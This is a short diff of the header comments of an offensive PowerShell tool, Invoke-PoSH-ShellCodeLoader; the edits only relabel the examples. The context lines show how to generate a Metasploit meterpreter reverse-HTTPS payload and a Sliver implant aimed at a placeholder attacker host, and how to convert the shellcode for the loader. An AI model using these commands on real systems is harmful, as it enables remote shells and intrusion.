@@ -16,12 +16,12 @@
 # > Invoke-PoSH-ShellCodeLoader -Type=MSF/Sliver/Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
 # > Invoke-PoSH-ShellCodeLoader -Type=MSF/Sliver/Havoc -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
 # ================================================================================================================================================
-# Input
-# -----
-# Example 1 (Metapsloit C2)
+# Input: 
+# ------
+# Example 1 (Metapsloit shellcode)
 # > msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o shellcode 
-# -----
-# Example 2 (Sliver C2)
+# ------
+# Example 2 (Sliver shellcode)
 # [server] sliver > generate --arch amd64 -f shellcode --http IP -l --os Windows --save shellcode 
 # $ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2
 # $ sed '$ s/.$//' shellcode2 > shellcode
